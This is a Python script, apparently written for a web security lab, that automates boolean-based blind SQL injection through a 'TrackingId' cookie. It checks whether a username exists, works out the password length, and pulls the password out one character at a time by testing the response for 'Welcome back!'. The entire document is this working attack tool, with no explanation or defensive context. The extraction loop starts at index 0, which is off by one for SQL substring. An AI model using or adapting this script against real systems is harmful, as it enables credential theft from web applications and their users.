import requests

total_queries = 0
charset = "0123456789abcdefghijklmnopqrstuvwxyz"
target = "Change-It"
needle = "Welcome back!"

# Function to perform injected query into a web application and return cookies
def injected_query(payload):
    global total_queries
    cookies = {
        "TrackingId": "96085869dmmdkkdjfj' and {}-- ".format(payload),
        "session": "fjsduifj3efmvlimdielwwwncde"
    }
    data = {
        "csrf": "DSFKLWEJKSDFJKFKMLSDFLRR68478",
        "username": "admin",
        "password": "admin"
    }
    r = requests.post(target, cookies=cookies, data=data)
    total_queries += 1
    return needle.encode() in r.content

# check if the username exists
def invalid_user(username):
    payload = "(select 'a' from users where username = '{}')='a'".format(username)
    return injected_query(payload)

# identify the length of the password
def password_length(username):
    i = 0
    flag = True
    while flag:
        payload = "(select 'a' from users where username = '{}' and length(password) <= {})='a'".format(username, i)
        if not injected_query(payload):
            i += 1
        else:
            flag = False
    return i

# Extracting the hash
def extract_hash(username,length):
    found=""
    for i in range(length+1):
        for char in charset:
            payload = "(select substring(password,{},1) from users where username='{}')='{}'".format(i,username,char)
            if injected_query(payload):
                found+=char
                break
            else:
                continue
           
    return found            


# Function to display total queries made
def total_queries_taken():
    global total_queries
    print("[i] {} total queries!".format(total_queries))
    total_queries = 0

# Main loop
while True:
    try:
        username = input("> Enter the Username: ")
        print(invalid_user(username))
        if invalid_user(username):
            user_password_length = password_length(username)
            print("[-] user {} hash length: {}".format(username, user_password_length))
            extractHash=input("Do you want to extract the hash?")
            if extractHash=="yes":
                print("Hash value: ",extract_hash(username,user_password_length))

            total_queries_taken()
        else:
            print("[X] user {} does not exist!".format(username))


    except KeyboardInterrupt:
        break
